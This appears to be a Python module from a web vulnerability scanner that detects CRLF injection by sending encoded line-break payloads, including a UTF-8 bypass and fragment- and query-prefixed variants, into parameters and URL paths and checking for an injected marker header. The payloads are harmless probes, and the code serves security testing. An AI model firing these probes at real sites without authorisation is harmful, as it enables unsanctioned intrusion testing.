#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CRLF injection / HTTP response splitting."""

from __future__ import annotations

from urllib.parse import unquote, urlsplit, urlunsplit

from core.methods import inject
from core.methods import modkit as kit
from core.methods import webinj
from core.methods.print import pvln

info = ("Finds CRLF injection (HTTP response splitting / header injection). Every "
        "parameter and the URL path receive encoded line breaks (CRLF, LF, CR and the "
        "UTF-8 '嘊嘍' bypass) followed by a random header. A finding is reported only "
        "when that random header shows up in the RESPONSE HEADERS; reflection in the "
        "body does not count.")
searchinfo = "CRLF Injection module"
properties = {**inject.OPTIONS, **webinj.COOKIE_OPTION}

# {h} = header line; already percent-encoded, sent raw
BREAKS = (
    "%0d%0a{h}",
    "%0a{h}",
    "%0d{h}",
    "%E5%98%8A%E5%98%8D{h}",       # U+560A U+560D: low bytes are \n \r
    "%0d%0a%09{h}",
    "%23%0d%0a{h}",                # after a fragment marker
    "%3f%0d%0a{h}",                # after a query marker (path context)
)


def _header():
    name = "X-" + inject.marker(6).capitalize()
    value = inject.marker(8)
    return name, value, f"{name}:%20{value}"


def _injected(resp, name: str, value: str) -> str:
    if resp is None:
        return ""
    got = resp.headers.get(name)
    if got is not None and value in got:
        return f"{name}: {got}"
    return ""


def check_point(point, s):
    for tmpl in BREAKS:
        name, value, line = _header()
        payload = tmpl.format(h=line)
        if point.method == "POST":  # form-encoded by requests: send decoded
            resp = point.send(s, unquote(payload), append=True, allow_redirects=False)
        else:
            resp = point.send(s, payload, append=True, raw=True, allow_redirects=False)
        hit = _injected(resp, name, value)
        if hit:
            return [inject.Finding(point, payload, kind="CRLF injection",
                                   evidence=f"injected response header {hit!r} "
                                            f"(HTTP {resp.status_code})")]
    return []


def path_bases(web) -> list[str]:
    parts = urlsplit(kit.url(web))
    root = urlunsplit((parts.scheme, parts.netloc, "", "", ""))
    bases = [root]
    path = parts.path.rstrip("/")
    if path:
        bases.append(root + path)
    return bases


def check_path(s, base: str):
    for tmpl in BREAKS:
        name, value, line = _header()
        payload = tmpl.format(h=line)
        url = f"{base}/{payload}"
        try:
            resp = s.get(url, allow_redirects=False)
        except Exception:
            continue
        hit = _injected(resp, name, value)
        if hit:
            point = inject.Point("GET", base + "/", (), "<path>")
            return [inject.Finding(point, payload, kind="CRLF injection (path)",
                                   evidence=f"injected response header {hit!r} "
                                            f"(HTTP {resp.status_code})")]
    return []


def crlf(web):
    pvln("CRLF Injection")
    record = kit.Recorder(web, kit.CRITICAL, "crlf")
    s = webinj.session(properties)
    findings = []
    kit.info("Testing the URL path...")
    for base in path_bases(web):
        hits = check_path(s, base)
        for f in hits:
            kit.found(f.kind, f"{base}/ <- {f.payload}")
        findings += hits
    points = inject.discover(web, properties)
    findings += inject.scan(points, lambda p: check_point(p, s))
    inject.report(findings, record, "No CRLF injection found.")
    return findings


def attack(web):
    crlf(web)
